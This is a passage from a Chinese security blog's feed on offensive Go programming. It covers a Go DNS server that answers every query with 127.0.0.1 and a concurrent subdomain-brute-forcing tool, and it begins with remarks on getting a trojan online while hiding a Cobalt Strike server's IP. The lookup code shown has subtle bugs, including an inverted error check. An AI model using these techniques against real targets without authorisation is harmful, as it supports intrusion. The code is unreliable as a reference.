class="line">192.168.1.17 attacker1.com</span><br><span class="line">192.168.1.17 attacker2.com</span><br></pre></td></tr></table></figure><p>运行之后就可以看到我们的木马已经上线。</p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230201225159639.png" alt="image-20230201225159639"></p><p>当然这里只能上线一个</p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230128143232789.png" alt="image-20230128143232789"></p><p>其实在cs中也是一样的道理，我们可以使用这种方法来保护我们的cs服务器真实ip。当然，我们之前说过的腾讯云函数上线也是这个道理，只不过云函数更进一步，会使用不同的网关进行上线。</p>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5.2DNS利用之服务端</title>
      <link href="/2023/02/01/Go/5.2DNS%E5%88%A9%E7%94%A8%E4%B9%8B%E6%9C%8D%E5%8A%A1%E7%AB%AF/"/>
      <url>/2023/02/01/Go/5.2DNS%E5%88%A9%E7%94%A8%E4%B9%8B%E6%9C%8D%E5%8A%A1%E7%AB%AF/</url>
      
        <content type="html"><![CDATA[<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>DNS服务器：Ubuntu18.04</p><p>下面镜像拖java。java8拖不了</p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230129182734568-1675263857645.png" alt="image-20230129182734568"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">wget https://dl.google.com/go/go1.17.8.linux-amd64.tar.gz</span><br><span class="line">tar -C /usr/local/ -xzf go1.17.8.linux-amd64.tar.gz</span><br><span class="line">不过呢，为了可以在任意路径下使用 go 命令，我们需要将 Go 二进制文件所在路径加入到环境变量 PATH 中，具体操作是将下面这行环境变量设置语句添加到 /etc/profile.d/go.sh 文件：</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> GOROOT=/usr/local/go</span><br><span class="line"><span class="built_in">export</span> GOPATH=/data/go</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$GOROOT</span>/bin:<span class="variable">$GOPATH</span></span><br><span class="line"><span class="built_in">export</span> GO111MODULE=<span class="string">&quot;on&quot;</span> <span class="comment"># 开启 Go moudles 特性</span></span><br><span class="line"><span class="built_in">export</span> GOPROXY=https://goproxy.cn,direct <span class="comment"># 安装 Go 模块时，国内代理服务器设置</span></span><br><span class="line"></span><br><span class="line">然后执行下面命令使上述环境变量的设置立即生效：</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure><h4 id="编写一个简单的DNS服务器"><a href="#编写一个简单的DNS服务器" class="headerlink" title="编写一个简单的DNS服务器"></a>编写一个简单的DNS服务器</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;github.com/miekg/dns&quot;</span></span><br><span class="line">   <span class="string">&quot;log&quot;</span></span><br><span class="line">   <span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="comment">/*******dns.HandleFunc()********/</span></span><br><span class="line">   <span class="comment">/******第一个参数：要匹配的查询模式(.表示处理所有请求)*******/</span></span><br><span class="line">   dns.HandleFunc(<span class="string">&quot;.&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w dns.ResponseWriter, req *dns.Msg)</span></span> &#123;</span><br><span class="line">      <span class="keyword">var</span> resp dns.Msg    </span><br><span class="line">      resp.SetReply(req)  <span class="comment">//创建新消息并设置回复</span></span><br><span class="line">      <span class="keyword">for</span> _, q := <span class="keyword">range</span> req.Question &#123;  <span class="comment">//遍历</span></span><br><span class="line">         a := dns.A&#123;   <span class="comment">//使用A记录为每个询问创建应答</span></span><br><span class="line">            Hdr: dns.RR_Header&#123;</span><br><span class="line">               Name:   q.Name,</span><br><span class="line">               Rrtype: dns.TypeA,</span><br><span class="line">               Class:  dns.ClassINET,</span><br><span class="line">               Ttl:    <span class="number">0</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            A: net.ParseIP(<span class="string">&quot;127.0.0.1&quot;</span>).To4(),</span><br><span class="line">         &#125;</span><br><span class="line">         resp.Answer = <span class="built_in">append</span>(resp.Answer, &amp;a)  <span class="comment">//将响应内容附加到响应字段Answer中</span></span><br><span class="line">      &#125;</span><br><span class="line">      w.WriteMsg(&amp;resp)  <span class="comment">//响应完成后，将消息写入调用客户端</span></span><br><span class="line">   &#125;)</span><br><span class="line">   log.Fatal(dns.ListenAndServe(<span class="string">&quot;:53&quot;</span>, <span class="string">&quot;udp&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>运行时要解决端口占用的情况（这里弄了很久）</p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230130124333353-1675263857646.png" alt="image-20230130124333353"></p></li><li><p>使用dig进行测试。确认你要查询的主机名解析为127.0.0.1。</p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230130124459002-1675263857646.png" alt="image-20230130124459002"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5.1DNS利用之客户端</title>
      <link href="/2023/02/01/Go/5.1DNS%E5%88%A9%E7%94%A8%E4%B9%8B%E5%AE%A2%E6%88%B7%E7%AB%AF/"/>
      <url>/2023/02/01/Go/5.1DNS%E5%88%A9%E7%94%A8%E4%B9%8B%E5%AE%A2%E6%88%B7%E7%AB%AF/</url>
      
        <content type="html"><![CDATA[<h4 id="检索A记录"><a href="#检索A记录" class="headerlink" title="检索A记录"></a>检索A记录</h4><ul><li><p>首先我们来解析DNS中的A记录，该记录了域名对应的IP地址，在我们的子域名爆破中，我们只需要查看该域名是否能解析到IP地址，如果能解析到，则说明存在该子域名，反之则不存在。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> msg dns.Msg                    <span class="comment">//创建一个新的msg</span></span><br><span class="line">fqdn := dns.Fqdn(<span class="string">&quot;stacktitan.com&quot;</span>) <span class="comment">//调用Fqdn()将域转换为可以与DNS服务器交换的FQDN</span></span><br><span class="line">msg.SetQuestion(fqdn, dns.TypeA)   <span class="comment">//msf存放查找A记录的意图</span></span><br><span class="line">dns.Exchange(&amp;msg, <span class="string">&quot;8.8.8.8:53&quot;</span>)   <span class="comment">//将信息发送到提供的服务器地址(该地址是Google的DNS服务器)</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230129120401553-1675263773785.png" alt="image-20230129120401553"></p><ul><li><p>tcpdump</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i en0 -n udp port 53</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230129120622414-1675263773786.png" alt="image-20230129120622414"></p><h4 id="使用Msg结构体处理应答"><a href="#使用Msg结构体处理应答" class="headerlink" title="使用Msg结构体处理应答"></a>使用Msg结构体处理应答</h4><ul><li><p>dns.Exchange(&amp;msg, “8.8.8.8:53”)为什么返回*msg类型</p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230129123151998-1675263773786.png" alt="image-20230129123151998"></p><ul><li><p>可以看下图中Msg结构体的构成，包含了DNS问询及其应答。这样我们就可以用一个统一的结构体解决通信的问题。</p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230129123615220-1675263773786.png" alt="image-20230129123615220"></p></li></ul></li><li><p>在刚刚的代码基础上增加了应答</p><ol><li>首先接受DNS服务器的响应结果，然后检查是否存在错误</li><li>然后确认切片Answer的长度至少为1，如果不是1，则说明记录没有立即返回，因为在某些情况下会存在域名无法解析的情况</li><li>处理应答，并检查断言(理解为其他的语言的类型转换)</li></ol></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">var</span> msg dns.Msg</span><br><span class="line">   fqdn := dns.Fqdn(<span class="string">&quot;stacktitan.com&quot;</span>)</span><br><span class="line">   msg.SetQuestion(fqdn, dns.TypeA)</span><br><span class="line">   in, err := dns.Exchange(&amp;msg, <span class="string">&quot;8.8.8.8:53&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="built_in">panic</span>(err)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span> &#123; <span class="comment">//确认切片Answer的长度都至少为1。否则表明没有记录。直接返回</span></span><br><span class="line">      fmt.Println(<span class="string">&quot;No records&quot;</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span> _, answer := <span class="keyword">range</span> in.Answer &#123; <span class="comment">//取出应答的记录</span></span><br><span class="line">      <span class="keyword">if</span> a, ok := answer.(*dns.A); ok &#123;  <span class="comment">//这步加上还是会好些，确保处理的类型是*dns.A.</span></span><br><span class="line">         fmt.Println(a.A)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//fmt.Println(answer)</span></span><br><span class="line">      <span class="comment">//fmt.Println(answer.(*dns.A).A)</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="枚举子域"><a href="#枚举子域" class="headerlink" title="枚举子域"></a>枚举子域</h4><p>然后，我们来一步步完成子域名枚举的工具，首先我们要知道，我们都需要哪些参数来启动我们的程序，比如目标的根域名、字典的文件名、DNS服务器的地址以及需要的线程数量。我们可以使用flag包来像python那样，使用-xxx xxx来从命令行获取用户输入的参数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">flDomain = flag.String(<span class="string">&quot;Domain&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;The domain to perform guessing against.&quot;</span>)</span><br><span class="line">flWordlist = flag.String(<span class="string">&quot;Wordlist&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;The wordlist to use for guessing.&quot;</span>)</span><br><span class="line">flWorkerCount = flag.Int(<span class="string">&quot;c&quot;</span>, <span class="number">100</span>, <span class="string">&quot;The amount of workers to use.&quot;</span>)</span><br><span class="line">flServerAddr = flag.String(<span class="string">&quot;server&quot;</span>, <span class="string">&quot;8.8.8.8:53&quot;</span>, <span class="string">&quot;The DNS server to use.&quot;</span>)</span><br><span class="line">)</span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *flDomain == <span class="string">&quot;&quot;</span> || *flWordlist == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;-domain and -wordlist are required&quot;</span>)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(*flWorkerCount, *flServerAddr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="查询A记录和CHAME记录"><a href="#查询A记录和CHAME记录" class="headerlink" title="查询A记录和CHAME记录"></a>查询A记录和CHAME记录</h4><ul><li><p>为了让我们的工具输出可解析的域名及其IP地址。创建一个结构体来存储信息</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> result <span class="keyword">struct</span> &#123;</span><br><span class="line">IPAddress <span class="type">string</span></span><br><span class="line">Hostname  <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>然后我们需要创建2个函数来执行查询，一个用来查询A记录，一个用来查询CNAME记录。两个函数均接受FQDN作为第一个参数，并接受DNS服务器的地址作为第二个参数。每个函数都返回一个字符串切片和一个错误</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookupA</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> msg dns.Msg</span><br><span class="line">   <span class="keyword">var</span> ips []<span class="type">string</span></span><br><span class="line">   msg.SetQuestion(dns.Fqdn(fqdn), dns.TypeA)</span><br><span class="line">   in, err := dns.Exchange(&amp;msg, serverAddr)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> ips, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> ips, errors.New(<span class="string">&quot;no answer&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span> _, answer := <span class="keyword">range</span> in.Answer &#123;</span><br><span class="line">      <span class="keyword">if</span> a, ok := answer.(*dns.A); ok &#123;</span><br><span class="line">         ips = <span class="built_in">append</span>(ips, a.A.String())</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> ips, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookupCNAME</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> m dns.Msg</span><br><span class="line">   <span class="keyword">var</span> fqdns []<span class="type">string</span></span><br><span class="line">   m.SetQuestion(dns.Fqdn(fqdn), dns.TypeCNAME)</span><br><span class="line">   in, err := dns.Exchange(&amp;m, serverAddr)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> fqdns, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> fqdns, errors.New(<span class="string">&quot;no answer&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span> _, answer := <span class="keyword">range</span> in.Answer &#123;</span><br><span class="line">      <span class="keyword">if</span> c, ok := answer.(*dns.CNAME); ok &#123;</span><br><span class="line">         fqdns = <span class="built_in">append</span>(fqdns, c.Target)</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> fqdns, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>我们还需要创建一个lookup函数用来处理域名和查询到的ip信息。在这之前，我们需要知道什么是CNAME类型。</li><li>我们的域名不仅仅可以解析成一个ip，还是可以解析成域名的，比如我们将a.haochen1204.com解析成b.haochen1204.com再将b.haochen1204.com解析成c.haocen1204.com，这是一个解析链，所以我们需要查询的a.haochen1204.com的ip，<strong>实际上</strong>存储在c.haochen1204.com的A记录中。</li><li>在lookup函数中，我们首先也是接受了用户要枚举的域名和DNS服务器地址。然后创建一个用来存储结果的结构体，用来将我们查询到的域名和他的（可能是多个）ip对应存放。然后进入一个死循环，首先不断的去查询目标的CNAME字段，直到查询的结果为空，则证明我们查询到了链中的最后一个域名，比如我们上面链中c.haochen1204.com，然后去查找它的A记录，将查询到的结果与我们输入的域名对应起来。比如a.haochen1204.com -&gt; b.haochen1204.com -&gt; c.haochen1204.com  而c.haochen1204.com解析的ip为1.1.1.1和2.2.2.2，那么则存放<strong>a.haochen1204.com -&gt;  1.1.1.1</strong>和<strong>a.haochen1204.com -&gt; 2.2.2.2</strong>。最后，将我们的结果返回</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookup</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> []result &#123;</span><br><span class="line">    <span class="keyword">var</span> results []result</span><br><span class="line">    <span class="keyword">var</span> cfqdn = fqdn <span class="comment">//请不要修改原始信息</span></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        cnames, err := lookupCNAME(cfqdn, serverAddr)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; <span class="built_in">len</span>(cnames) &gt; <span class="number">0</span> &#123;</span><br><span class="line">            cfqdn = cnames[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment">//我们必须处理下一个CNAME</span></span><br><span class="line">        &#125;</span><br><span class="line">        ips, err := lookupA(cfqdn, serverAddr)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>  <span class="comment">//该主机名没有A记录</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> _, ip := <span class="keyword">range</span> ips &#123;</span><br><span class="line">            results := <span class="built_in">append</span>(results, result&#123;IPAddress:ip, Hostname:fqdn&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="添加并发"><a href="#添加并发" class="headerlink" title="添加并发"></a>添加并发</h4><ul><li>然后我们来创建一个goroutine池，用来不断启动我们刚刚完成的lookup函数</li><li>在python中，使用多线程有个很头疼的问题，就是无法获取线程的返回值，而在go中，我们可以通过管道解决这个问题，顺便解决了子线程未运行完，主线程便结束的问题。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(tracker <span class="keyword">chan</span> empty, fqdns <span class="keyword">chan</span> <span class="type">string</span>, gather <span class="keyword">chan</span> []result, serverAddr <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">   <span class="keyword">for</span> fqdn := <span class="keyword">range</span> fqdns &#123; <span class="comment">//fqdns管道储存要枚举得子域名数据</span></span><br><span class="line">      results := lookup(fqdn, serverAddr)</span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">len</span>(results) &gt; <span class="number">0</span> &#123;</span><br><span class="line">         gather &lt;- results <span class="comment">//gather管道收集输出</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">var</span> e empty</span><br><span class="line">   tracker &lt;- e <span class="comment">//判断协程的执行情况</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如上述代码，我们创建了一个空的结构体，他用来跟踪线程的执行情况，判断其是否执行完成，<strong>为什么使用空的结构体呢</strong>，因为他的大小是0b，而我们也不需要他存储什么数据</li><li>然后我们在主函数中需要添加一些内容，创建我们需要的3个管道以及我们接受最终结果的result结构体列表。通过用户提供的线程数量，将fqdns管道创建为缓冲管道，剩下的管道均为一次只能通过一个数据的管道，如果这个数据阻塞，则剩下的也会阻塞。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> results []result</span><br><span class="line">fqdns := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, *flWorkerCount) <span class="comment">//flWorkerCount = flag.int()</span></span><br><span class="line">gather := <span class="built_in">make</span>(<span class="keyword">chan</span> []result)</span><br><span class="line">tracker := <span class="built_in">make</span>(<span class="keyword">chan</span> empty)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动工人函数</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; *flWorkerCount; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> worker(tracker, fqdns, gather, *flServerAddr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="使用bufio包创建一个文本扫描器"><a href="#使用bufio包创建一个文本扫描器" class="headerlink" title="使用bufio包创建一个文本扫描器"></a>使用bufio包创建一个文本扫描器</h4><ul><li>用bufio包创建一个sacnner，该文本扫描器允许我们一次一行的读取文件。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建新的scanner</span></span><br><span class="line">file, err := os.Open(*flWordlist)</span><br><span class="line"><span class="keyword">defer</span> file.Close()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">scanner := bufio.NewScanner(file)</span><br><span class="line"><span class="keyword">for</span> scanner.Scan() &#123;</span><br><span class="line">fqdns &lt;- fmt.Sprintf(<span class="string">&quot;%s.%s&quot;</span>, scanner.Text(), *flDomain) <span class="comment">//拼接并将下一个子域名传入fqdns管道</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="收集和显示结果"><a href="#收集和显示结果" class="headerlink" title="收集和显示结果"></a>收集和显示结果</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读取结果</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> r := <span class="keyword">range</span> gather &#123;</span><br><span class="line">results = <span class="built_in">append</span>(results, r...)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> e empty</span><br><span class="line">tracker &lt;- e</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭通道（并关闭tracker，线程的执行情况）</span></span><br><span class="line"><span class="built_in">close</span>(fqdns)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; *flWorkerCount; i++ &#123;</span><br><span class="line">&lt;-tracker</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">close</span>(gather)</span><br><span class="line">&lt;-tracker</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印结果</span></span><br><span class="line">w := tabwriter.NewWriter(os.Stdout, <span class="number">0</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> _, r := <span class="keyword">range</span> results &#123;</span><br><span class="line">fmt.Fprintf(w, <span class="string">&quot;%s\t%s\n&quot;</span>, r.Hostname, r.IPAddress)</span><br><span class="line">&#125;</span><br><span class="line">w.Flush() <span class="comment">//输出</span></span><br></pre></td></tr></table></figure><h4 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span 